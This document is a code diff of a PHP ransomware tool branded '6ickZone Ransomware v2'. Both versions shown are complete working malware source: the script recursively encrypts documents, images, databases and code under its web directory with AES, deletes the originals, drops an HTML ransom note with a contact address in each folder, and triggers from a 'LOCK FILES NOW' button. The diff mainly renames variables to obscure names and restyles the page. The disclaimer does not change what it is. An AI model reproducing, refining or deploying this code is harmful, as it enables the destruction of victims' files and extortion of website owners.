@@ -1,18 +1,17 @@
 <?php
-// 6ickZone Ransomware v2 - Obfuscated Light Version
+// 6ickZone Ransomware v2 - Obfuscated Light
 set_time_limit(0);
 error_reporting(0);
 
 // --- Configuration ---
-$_6 = "scarletdablackrose"; // NOTE: $key → $_6
-$_c = ".6ick";              // NOTE: $newExtension → $_c
-$_k = "!!!DECRYPT_ME!!!.html"; // NOTE: $ransomNoteFilename → $_k
+$k = "scarletdablackrose";
+$e = ".6ickZone";
+$n = "!!!DECRYPT_ME!!!.html";
 
-// Files/folders to exclude
-$_z = [ // NOTE: $excludeList → $_z
+$x = [
     basename(__FILE__),
     'decrypt.php',
-    $_k,
+    $n,
     '.htaccess',
     '.user.ini',
     'web.config',
@@ -29,85 +28,66 @@ $_z = [ // NOTE: $excludeList → $_z
     'package.json',
 ];
 
-// Target extensions to encrypt
-$_o = [ // NOTE: $targetExtensions → $_o
-    'txt', 'doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx', 'pdf',
-    'jpg', 'jpeg', 'png', 'gif', 'mp3', 'mp4', 'avi', 'mov',
-    'zip', 'rar', '7z', 'sql', 'db', 'mdb', 'accdb', 'psd',
-    'ai', 'html', 'svg', 'php', 'js', 'css', 'json', 'xml', 'csv',
+$t = [
+    'txt','doc','docx','xls','xlsx','ppt','pptx','pdf',
+    'jpg','jpeg','png','gif','mp3','mp4','avi','mov',
+    'zip','rar','7z','sql','db','mdb','accdb','psd',
+    'ai','html','svg','php','js','css','json','xml','csv',
 ];
 
-// Counter for encrypted files
-$_i = 0; // NOTE: $encryptedFilesCount → $_i
+$c = 0;
 
-function encryptFile($filePath, $encryptionKey, $newExtension) {
-    global $_i;
+function z($f, $k, $e) {
+    global $c;
+    $d = @file_get_contents($f);
+    if ($d === false) return false;
+    if (substr($d, 0, 9) === "6ickZone:") return false;
 
-    $data = file_get_contents($filePath);
-    if ($data === false) return false;
+    $i = openssl_random_pseudo_bytes(16);
+    $ed = openssl_encrypt($d, 'AES-128-CBC', $k, OPENSSL_RAW_DATA, $i);
+    if ($ed === false) return false;
 
-    $header_len = strlen("6ickZone:");
-    if (substr($data, 0, $header_len) === "6ickZone:") {
-        return false;
-    }
+    $fd = "6ickZone:" . base64_encode($i . $ed);
+    if (file_put_contents($f . $e, $fd) === false) return false;
+    if (!unlink($f)) return false;
 
-    $iv = openssl_random_pseudo_bytes(16);
-    $encryptedData = openssl_encrypt($data, 'AES-128-CBC', $encryptionKey, OPENSSL_RAW_DATA, $iv);
-    if ($encryptedData === false) return false;
-
-    $finalData = "6ickZone:" . base64_encode($iv . $encryptedData);
-
-    if (file_put_contents($filePath . $newExtension, $finalData) === false) {
-        return false;
-    }
-
-    if (!unlink($filePath)) {
-        return false;
-    }
-
-    $_i++;
+    $c++;
     return true;
 }
 
-function dropRansomNote($directory, $encryptionKey, $noteFilename) {
-    $_n = "<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'><title>!!! FILES ENCRYPTED !!!</title><style>body{font-family:'Courier New',monospace;background:#000;color:#0f0;text-align:center;padding:50px;}h1{color:#f00;}p{margin:20px 0;}code{background:#333;padding:2px 5px;border-radius:3px;}.key-info{border:1px solid #0f0;padding:15px;display:inline-block;margin-top:30px;}</style></head><body><h1>!!! ALL YOUR FILES HAVE BEEN ENCRYPTED BY 6ickZone RANSOMWARE !!!</h1><p>Your important documents, photos, databases, and other files are now inaccessible.</p><p>To restore your data, you need the decryption key.</p><div class='key-info'><p>Your Decryption Key:</p>????<strong>LoL.</strong></p></div><p>Contact us at 6ickwhispers@gmail.com for further instructions.</p><p>Warning: Attempting to decrypt without the correct key may corrupt your files permanently.</p></body></html>";
-    // NOTE: $noteContent → $_n
-    file_put_contents($directory . DIRECTORY_SEPARATOR . $noteFilename, $_n);
+function y($d, $k, $n) {
+    $m = "<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'><title>!!! FILES ENCRYPTED !!!</title><style>body{font-family:'Courier New',monospace;background:#000;color:#0f0;text-align:center;padding:50px;}h1{color:#f00;}p{margin:20px 0;}code{background:#333;padding:2px 5px;border-radius:3px;}.key-info{border:1px solid #0f0;padding:15px;display:inline-block;margin-top:30px;}</style></head><body><h1>!!! ALL YOUR FILES HAVE BEEN ENCRYPTED BY 6ickZone RANSOMWARE !!!</h1><p>Your important documents, photos, databases, and other files are now inaccessible.</p><p>To restore your data, you need the decryption key.</p><div class='key-info'><p>Your Decryption Key:</p>????<strong>LoL.</strong></p></div><p>Contact us at 6ickwhispers@gmail.com for further instructions.</p><p>Warning: Attempting to decrypt without the correct key may corrupt your files permanently.</p></body></html>";
+    file_put_contents($d . DIRECTORY_SEPARATOR . $n, $m);
 }
 
-function scanAndEncryptRecursive($dir, $encryptionKey, $excludeList, $targetExtensions, $newExtension, $ransomNoteFilename) {
-    global $_i;
+function x($d, $k, $x, $t, $e, $n) {
+    global $c;
+    y($d, $k, $n);
 
-    dropRansomNote($dir, $encryptionKey, $ransomNoteFilename);
+    $l = scandir($d);
+    foreach ($l as $i) {
+        if ($i === '.' || $i === '..') continue;
+        $p = $d . DIRECTORY_SEPARATOR . $i;
+        if (in_array($i, $x)) continue;
 
-    $items = scandir($dir);
-    foreach ($items as $item) {
-        if ($item === '.' || $item === '..') continue;
-
-        $path = $dir . DIRECTORY_SEPARATOR . $item;
-
-        if (in_array($item, $excludeList)) continue;
-
-        if (is_dir($path)) {
-            scanAndEncryptRecursive($path, $encryptionKey, $excludeList, $targetExtensions, $newExtension, $ransomNoteFilename);
-        } elseif (is_file($path)) {
-            if (pathinfo($path, PATHINFO_EXTENSION) === trim($newExtension, '.')) continue;
-
-            if (!empty($targetExtensions)) {
-                $file_ext = pathinfo($path, PATHINFO_EXTENSION);
-                if (!in_array($file_ext, $targetExtensions)) continue;
+        if (is_dir($p)) {
+            x($p, $k, $x, $t, $e, $n);
+        } elseif (is_file($p)) {
+            if (pathinfo($p, PATHINFO_EXTENSION) === trim($e, '.')) continue;
+            if (!empty($t)) {
+                $fx = pathinfo($p, PATHINFO_EXTENSION);
+                if (!in_array($fx, $t)) continue;
             }
-
-            encryptFile($path, $encryptionKey, $newExtension);
+            z($p, $k, $e);
         }
     }
 }
 
-// Main logic
-$_e = false; // NOTE: $operation_status → $_e
+// --- Execution ---
+$run = false;
 if (isset($_POST['lock'])) {
-    $_e = true;
-    scanAndEncryptRecursive(__DIR__, $_6, $_z, $_o, $_c, $_k);
+    $run = true;
+    x(__DIR__, $k, $x, $t, $e, $n);
 }
 ?>
 
@@ -116,84 +96,44 @@ if (isset($_POST['lock'])) {
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <title>6ickZone Ransomware (v2) - Fixed</title>
     <style>
-        body {
-            background: #0d0d0d;
-            color: #eee;
-            font-family: 'Courier New', monospace;
-            text-align: center;
-            padding-top: 50px;
-        }
-        h1 {
-            color: #f44336;
-        }
-        button {
-            background: #f44336;
-            border: none;
-            padding: 15px 30px;
-            color: #fff;
-            font-size: 16px;
-            cursor: pointer;
-            border-radius: 5px;
-        }
-        button:hover {
-            background: #c62828;
-        }
-        .info {
-            margin-top: 20px;
-            font-size: 18px;
-        }
-        .footer {
-            margin-top: 50px;
-            font-size: 14px;
-            color: #777;
-        }
-        code {
-            background: #333;
-            padding: 2px 6px;
-            border-radius: 4px;
-        }
-        .warning {
-            color: #ffeb3b;
-            font-weight: bold;
-            margin-bottom: 20px;
-        }
-        .key-display {
-            background: #222;
-            padding: 15px;
-            border-radius: 8px;
-            display: inline-block;
-            margin-top: 20px;
-        }
+        html, body { margin: 0; padding: 0; height: 100%; font-family: monospace;
+            background: url('https://i.imgur.com/lHnsQI3.jpeg') no-repeat center center fixed;
+            background-size: cover; color: #ffeb3b; }
+        h1 { color: #f44336; margin-top: 0; text-shadow: 2px 2px 4px #000; }
+        button { background: #9b59b6; border: none; padding: 12px 24px; color: #fff;
+            font-size: 14px; cursor: pointer; border-radius: 4px; margin-top: 10px;
+            transition: background 0.3s ease; }
+        button:hover { background: #8e44ad; }
+        .warning { color: #ffeb3b; font-weight: bold; margin-bottom: 20px; }
+        code { color: #ffeb3b; }
+        .footer { margin-top: 50px; font-size: 14px; color: #aaa; text-align: center; }
+        .container { padding: 100px 20px 40px; text-align: center; }
     </style>
 </head>
 <body>
-    <h1>6ickZone Ransomware (v2)</h1>
-    <p class="warning">
-        Illegal Usage:
-Using ransomware tools without explicit authorization is illegal and considered a cybercrime.<br />
-        Use at your own risk.!<br />
-        The creator holds no responsibility for any consequences arising from misuse.
-    </p>
+    <div class="container">
+        <h1>6ickZone Ransomware</h1>
+        <p class="warning">
+            Illegal Usage:<br />
+            Using ransomware tools without explicit authorization is illegal and considered a cybercrime.<br />
+            Use at your own risk!<br />
+            The creator holds no responsibility for any consequences arising from misuse.
+        </p>
 
-    <?php if (!$_e): ?>
-    <p>Auto scan & encrypt all target files in this directory and its subfolders.</p>
-    <form method="post">
-        <button type="submit" name="lock">LOCK FILES NOW</button>
-    </form>
-<?php else: ?>
-    <div class="info">
-        <p>Done! Total file terenkripsi: <strong><?php echo $_i; ?></strong></p>
-        <p>Encrypted files now have the extension <code><?php echo htmlspecialchars($_c); ?></code>.</p>
-        <p>Check each folder to find the file <code><?php echo htmlspecialchars($_k); ?></code>.</p>
-        <div class="key-display">
-            <p>Key for Decryption (PLEASE NOTE CAREFULLY FOR DECRYPTION):</p>
-            <code><?php echo htmlspecialchars($_6); ?></code>
-        </div>
+        <?php if (!$run): ?>
+            <p>Auto scan & encrypt all target files in this directory and its subfolders.</p>
+            <form method="post">
+                <button type="submit" name="lock">LOCK FILES NOW</button>
+            </form>
+        <?php else: ?>
+            <p>total encrypted files: <strong><?php echo $c; ?></strong></p>
+            <p>Encrypted files now have the extension <code><?php echo htmlspecialchars($e); ?></code>.</p>
+            <p>Check each folder to find the file <code><?php echo htmlspecialchars($n); ?></code>.</p>
+            <p>Key for Decryption:</p>
+            <code><?php echo htmlspecialchars($k); ?></code>
+        <?php endif; ?>
+        <div class="footer">by Nyx6st - 6ickZone</div>
     </div>
-<?php endif; ?>
-
-    <div class="footer">by 0x6ick - 6ickZone</div>
 </body>
 </html>
